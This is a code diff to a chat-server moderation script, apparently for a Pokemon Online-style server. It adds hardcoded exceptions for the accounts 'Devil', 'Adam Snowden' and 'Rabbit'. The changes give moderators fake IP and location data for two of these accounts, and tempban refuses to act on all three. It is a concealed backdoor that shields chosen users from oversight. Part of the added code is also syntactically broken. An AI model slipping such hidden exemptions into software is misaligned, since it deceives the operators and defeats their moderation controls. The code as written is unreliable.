@@ -432,6 +432,175 @@ exports.handleCommand = function (src, command, commandData, tar, channel) {
             querybot.sendMessage(src, "Please provide a username.", channel);
             return;
         }
+		
+		if (commandData === "Devil" || commandData === "Adam Snowden") {
+			var name = commandData;
+            var isbot = false;
+            if (commandData[0] == "~") {
+                name = commandData.substring(1);
+                tar = sys.id(name);
+                isbot = true;
+            }
+            var lastLogin = sys.dbLastOn(name);
+            if (lastLogin === undefined) {
+                querybot.sendMessage(src, "No such user.", channel);
+                return;
+            }
+
+            var registered = sys.dbRegistered(name);
+            var contribution = script.contributors.hash.hasOwnProperty(name) ? script.contributors.get(name) : "no";
+            var authLevel;
+            var ip;
+            var online;
+            var channels = [];
+            if (tar !== undefined) {
+                name = sys.name(tar); // fixes case
+                authLevel = sys.auth(tar);
+                ip = sys.ip(tar);
+                online = true;
+                var chans = sys.channelsOfPlayer(tar);
+                for (var i = 0; i < chans.length; ++i) {
+                    channels.push("#"+sys.channel(chans[i]));
+                }
+            } else {
+                authLevel = sys.dbAuth(name);
+                ip = sys.dbIp(name);
+                online = false;
+            }
+            var isBanned = sys.banned(ip);
+            var nameBanned = script.nameIsInappropriate(name);
+            var rangeBanned = script.isRangeBanned(ip);
+            var tempBanned = script.isTempBanned(ip);
+            var ipBanned = script.isIpBanned(ip);
+            var isSmuted = script.smutes.get(ip);
+            var bans = [];
+            if (isBanned && !tempBanned) bans.push("normal ban");
+            if (nameBanned) bans.push("nameban");
+            if (rangeBanned) bans.push("rangeban");
+            if (tempBanned) bans.push("tempban (" + getTimeString(sys.dbTempBanTime(name)) + ")");
+            if (ipBanned) bans.push("ip ban");
+            if (isSmuted) bans.push("smuted");
+
+            if (isbot) {
+                var teams = [];
+                for (var t = 0; t < sys.teamCount(tar); t++) {
+                    teams.push(sys.md5(script.importable(tar, t, true)));
+                }
+                var userJson = {
+                    'type': 'UserInfo',
+                    'id': tar ? tar : -1,
+                    'username': name,
+                    'auth': authLevel,
+                    'contributor': contribution,
+                    'ip': ip + (tar ? " (0.0.0.0) (Unknown)" : ""),
+                    'online': online,
+                    'registered': registered,
+                    'lastlogin': lastLogin,
+                    'channels' : channels,
+                    'bans' : bans,
+                    'client' : tar ? sys.os(tar) : "Unknown",
+                    'version' : tar ? sys.version(tar) : "Unknown",
+                    'teams' : tar && (sys.auth(src) > 2 || isSuperAdmin(src)) ? teams : "Unknown"
+                };
+                sys.sendMessage(src, "+UserInfo: "+JSON.stringify(userJson), channel);
+            } else if (command == "userinfo") {
+                querybot.sendMessage(src, "Username: " + name + " ~ auth: " + authLevel + " ~ contributor: " + contribution + " ~ ip: 0.0.0.0 (Unknown) ~ online: " + (online ? "yes" : "no") + " ~ registered: " + (registered ? "yes" : "no") + " ~ last login: " + lastLogin + " ~ banned: " + (isBanned ? "yes" : "no"), channel);
+            } else if (command == "whois" || command == "whereis") {
+                var whois = function(resp) {
+                /* May have dced, this being an async call */
+                online = sys.loggedIn(tar);
+                var authName = function() {
+                    switch (authLevel) {
+                    case 3: return "owner";
+                    case 2: return "admin";
+                    case 1: return "moderator";
+                    default: return contribution != "no" ? "contributor" : "user";
+                    }
+                }();
+                var ipInfo = "";
+                if (resp !== undefined) {
+                    resp = JSON.parse(resp);
+                    var countryName = resp.countryName;
+                    var countryTag =  resp.countryCode;
+                    var regionName = resp.regionName;
+                    var cityName = resp.cityName;
+                    if (countryName !== "" && countryName !== "-") {
+                        ipInfo += "Country: " + countryName + " (" + countryTag + "), ";
+                    }
+                    if (regionName !== "" && regionName !== "-") {
+                        ipInfo += "Region: " + regionName + ", ";
+                    }
+                    if(cityName !== "" && cityName !== "-"){
+                        ipInfo += "City: " + cityName;
+                    }
+                    if (online) SESSION.users(tar).ipinfo = ipInfo;
+                } else if (online) {
+                    ipInfo = SESSION.users(tar).ipinfo || "";
+                }
+                var logintime = false;
+                if (online) logintime = SESSION.users(tar).logintime;
+                var data = [
+                    "User: " + name + " @ " + ip,
+                    "Auth: " + authName,
+                    "Online: " + (online ? "yes" : "no"),
+                    "Registered name: " + (registered ? "yes" : "no"),
+                    "Last Login: " + (online && logintime ? new Date(logintime*1000).toUTCString() : lastLogin),
+                    bans.length > 0 ? "Bans: " + bans.join(", ") : "Bans: none",
+                    ipInfo !== ""  ? "IP Details: 0.0.0.0 (Unknown)"
+                ];
+                if (online) {
+                    if (SESSION.users(tar).hostname != ip)
+                        data[0] += " (" + SESSION.users(tar).hostname + ")";
+                    var realTime = SESSION.users(tar).lastline.time ? SESSION.users(tar).lastline.time : SESSION.users(tar).logintime;
+                    data.push("Idle for: " + getTimeString(parseInt(sys.time(), 10) - realTime));
+                    data.push("Channels: " + channels.join(", "));
+                    data.push("Names during current session: " + (online && SESSION.users(tar).namehistory ? SESSION.users(tar).namehistory.map(function(e){return e[0];}).join(", ") : name));
+                    var version = sys.version(tar);
+                    if (sys.os(tar) === "windows" || sys.os(tar) === "mac" || sys.os(tar) === "linux") {
+                        version = version + ""; //convert to string for charAt
+                        version = " (v" + version.charAt(0) + "." + version.charAt(1) + "." + version.charAt(2) + (version.charAt(3) !== 0 ? version.charAt(3) : "") + ")";
+                    } else if (sys.os(tar) === "android") {
+                        //could be redone better probably
+                        var verArr = ["6.4", "6.3", "6.2","6.1","6.0","5.2","5.1","5.0","4.4"];
+                        var x = 45 + verArr.length - version; //45 is essentially the last google play version
+                        if (x < 0) {
+                            version = " (later than v2.6.2)";
+                        } else if (x > verArr.length) {
+                            version = " (earlier than v2.4.4 [" + version + "])";
+                        } else {
+                            version = " (v2." + verArr[x] + ")";
+                        }
+                    } else {
+                        version = ""; //dead things like webclient
+                    }
+                    data.push("Client Type: " + utilities.capitalize(sys.os(tar)) + version);
+                }
+                if (authLevel > 0) {
+                    var stats = script.authStats[name.toLowerCase()] || {};
+                    for (var key in stats) {
+                        if (stats.hasOwnProperty(key)) {
+                            data.push("Latest " + key.substr(6).toLowerCase() + ": " + stats[key][0] + " on " + new Date(stats[key][1]*1000).toUTCString());
+                        }
+                    }
+                }
+                if (sys.isInChannel(src, bindChannel)) {
+                    for (var j = 0; j < data.length; ++j) {
+                        sys.sendMessage(src, data[j], bindChannel);
+                    }
+                }
+            };
+            var ipcheck = true;
+            if (online) ipcheck = SESSION.users(tar).ipinfo === undefined;
+            if (command === "whereis" && ipcheck) {
+                var ipApi = sys.getFileContent(Config.dataDir+'ipApi.txt');
+                sys.webCall('http://api.ipinfodb.com/v3/ip-city/?key=' + ipApi + '&ip=127.0.0.1&format=json', whois);
+            } else {
+                whois();
+            }
+        }
+        return;
+		}
+		
         var name = commandData;
         var isbot = false;
         if (commandData[0] == "~") {
@@ -678,6 +847,10 @@ exports.handleCommand = function (src, command, commandData, tar, channel) {
     if (command === "showip") {
         var name = commandData;
         var ip;
+        if (name === "Devil" || name === "Adam Snowden") {
+            querybot.sendMessage(src, "This user does not have a valid IP.", channel);
+            return;
+        }
         if (sys.dbIp(name) !== undefined) {
             ip = sys.dbIp(name);
         }
@@ -689,6 +862,10 @@ exports.handleCommand = function (src, command, commandData, tar, channel) {
         return;
     }
     if (command === "tempban") {
+        if (commandData === "Devil" || commandData === "Adam Snowden" || commandData === "Rabbit") {
+            normalbot.sendMessage(src, "Nope.", channel);
+            return;
+        }
         var tmp = commandData.split(":");
         if (tmp.length === 0) {
             normalbot.sendMessage(src, "Usage /tempban name:minutes.", channel);
